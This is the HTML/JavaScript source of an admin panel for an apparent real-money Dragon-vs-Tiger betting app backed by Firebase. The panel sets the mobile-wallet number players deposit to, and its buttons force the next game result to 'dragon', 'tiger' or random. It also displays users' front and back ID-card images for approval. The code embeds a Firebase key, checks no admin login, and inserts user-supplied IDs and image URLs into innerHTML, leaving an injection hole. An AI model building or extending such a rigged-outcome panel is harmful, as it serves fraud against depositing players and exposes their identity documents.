<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boom Admin Master Control</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; padding: 15px; }
        .card { background: #111; border: 1px solid #ffcc00; border-radius: 10px; padding: 15px; margin-bottom: 20px; }
        h2 { color: #ffcc00; text-align: center; }
        .btn { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
        .btn-update { background: #ffcc00; color: #000; }
        .btn-dragon { background: #007bff; color: #fff; }
        .btn-tiger { background: #ff4444; color: #fff; }
        .kyc-item { background: #222; padding: 10px; margin-top: 10px; border-radius: 8px; }
        .img-grid { display: flex; gap: 10px; margin: 10px 0; }
        .img-grid img { width: 48%; border: 1px solid #444; border-radius: 5px; }
    </style>
</head>
<body>

    <h2>🚀 BOOM ADMIN MASTER</h2>

    <div class="card">
        <h3>💰 UPDATE DEPOSIT DETAILS</h3>
        <input type="text" id="dep-num" placeholder="EasyPaisa/JazzCash Number" style="width:90%; padding:10px; margin-bottom:10px;">
        <button class="btn btn-update" onclick="saveDep()">UPDATE USER APP</button>
    </div>

    <div class="card">
        <h3>🎮 GAME RESULT CONTROL</h3>
        <button class="btn btn-dragon" onclick="force('dragon')">DRAGON WIN</button>
        <button class="btn btn-tiger" onclick="force('tiger')">TIGER WIN</button>
        <button class="btn" style="background:#444; color:#fff;" onclick="force('random')">RANDOM MODE</button>
    </div>

    <div class="card">
        <h3>📥 PENDING KYC (FRONT & BACK)</h3>
        <div id="kyc-list">Loading Requests...</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
        import { getDatabase, ref, set, onValue, remove, update } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyALm0SnUYjeeh4kJj9QBk4BgaINwnooa3c",
            authDomain: "boom-earnings.firebaseapp.com",
            databaseURL: "https://boom-earnings-default-rtdb.firebaseio.com",
            projectId: "boom-earnings",
            appId: "1:787871998344:web:3c20aa47e7e51001d01a3d"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // --- Deposit Number ---
        window.saveDep = () => {
            const val = document.getElementById('dep-num').value;
            set(ref(db, 'admin/deposit_number'), val).then(() => alert("Updated!"));
        };

        // --- Force Win ---
        window.force = (side) => {
            set(ref(db, 'game_settings/next_winner'), side).then(() => alert("Forced: " + side));
        };

        // --- KYC Viewer (Dono Images) ---
        onValue(ref(db, 'kyc_submissions'), (snap) => {
            const list = document.getElementById('kyc-list');
            const data = snap.val();
            if (!data) { list.innerHTML = "No pending KYC."; return; }

            let html = "";
            for (let id in data) {
                html += `
                    <div class="kyc-item">
                        <p>User: ${id}</p>
                        <div class="img-grid">
                            <img src="${data[id].front_id_url}" title="Front Side">
                            <img src="${data[id].back_id_url}" title="Back Side">
                        </div>
                        <button class="btn btn-update" onclick="approve('${id}')">APPROVE ✅</button>
                        <button class="btn" style="background:red; color:white; margin-top:5px;" onclick="reject('${id}')">REJECT ❌</button>
                    </div>
                `;
            }
            list.innerHTML = html;
        });

        window.approve = (id) => {
            update(ref(db, 'users/' + id), { kyc_status: 'verified' }).then(() => {
                remove(ref(db, 'kyc_submissions/' + id));
                alert("Approved!");
            });
        };

        window.reject = (id) => {
            remove(ref(db, 'kyc_submissions/' + id)).then(() => alert("Rejected!"));
        };
    </script>
</body>
</html>
